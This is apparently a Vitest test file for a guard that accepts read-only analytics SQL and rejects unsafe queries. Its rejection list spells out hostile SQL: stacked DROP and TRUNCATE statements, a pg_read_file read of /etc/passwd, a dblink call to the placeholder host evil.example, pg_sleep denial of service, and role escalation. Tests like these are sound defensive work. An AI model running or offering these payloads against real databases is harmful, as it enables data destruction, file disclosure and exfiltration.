import { describe, it, expect } from "vitest";
import { guardSql, withRowLimit } from "@/lib/sql-guard";

describe("guardSql — accepts legitimate analytics queries", () => {
  it("allows a plain SELECT", () => {
    const r = guardSql("select name, city from zones order by name");
    expect(r.ok).toBe(true);
  });

  it("allows a CTE", () => {
    const r = guardSql(
      "with recent as (select * from v_attendance_daily where session_date > current_date - 30) select center_name, avg(attendance_rate) from recent group by center_name",
    );
    expect(r.ok).toBe(true);
  });

  it("unwraps a markdown fence, which models emit constantly", () => {
    const r = guardSql("```sql\nselect count(*) from students\n```");
    expect(r.ok).toBe(true);
    expect(r.sql).toBe("select count(*) from students");
  });

  it("strips a single trailing semicolon rather than rejecting it", () => {
    const r = guardSql("select 1;");
    expect(r.ok).toBe(true);
    expect(r.sql).toBe("select 1");
  });

  it("does not mistake updated_at for the UPDATE keyword", () => {
    const r = guardSql("select updated_at, created_at from students");
    expect(r.ok).toBe(true);
  });

  it("does not mistake a column named insert_count for INSERT", () => {
    const r = guardSql("select insert_count from v_center_stats");
    expect(r.ok).toBe(true);
  });
});

describe("guardSql — rejects everything that writes or escapes", () => {
  const rejected: [string, string][] = [
    ["a second statement", "select 1; drop table students"],
    ["a bare DELETE", "delete from students"],
    ["an UPDATE", "update students set active = false"],
    ["an INSERT", "insert into zones (name) values ('x')"],
    ["DROP behind a union", "select 1 union select 1; drop table zones"],
    ["a keyword hidden in a line comment", "select 1 -- \n; drop table zones"],
    ["a keyword hidden in a block comment", "select /* drop */ 1; truncate zones"],
    ["reading the auth schema", "select * from auth.users"],
    ["reading storage", "select * from storage.objects"],
    ["catalog probing", "select * from pg_catalog.pg_tables"],
    ["information_schema probing", "select * from information_schema.columns"],
    ["a sleep denial-of-service", "select pg_sleep(30)"],
    ["file reading", "select pg_read_file('/etc/passwd')"],
    ["dblink exfiltration", "select dblink('host=evil.example', 'select 1')"],
    ["SET before a select", "set role postgres; select 1"],
    ["an empty query", ""],
    ["prose instead of SQL", "I cannot answer that question."],
  ];

  for (const [label, sql] of rejected) {
    it(`rejects ${label}`, () => {
      const r = guardSql(sql);
      expect(r.ok, `expected rejection for: ${sql}`).toBe(false);
      expect(r.reason).toBeTruthy();
    });
  }

  it("is not fooled by a forbidden word appearing inside a string literal", () => {
    // The literal is neutralised, so this is a legitimate query and must pass.
    const r = guardSql("select * from students where notes = 'we had to drop the session'");
    expect(r.ok).toBe(true);
  });
});

describe("withRowLimit", () => {
  it("wraps the query so the result set is bounded", () => {
    expect(withRowLimit("select * from students", 10)).toBe(
      "select * from (select * from students) as upaygpt_result limit 10",
    );
  });
});
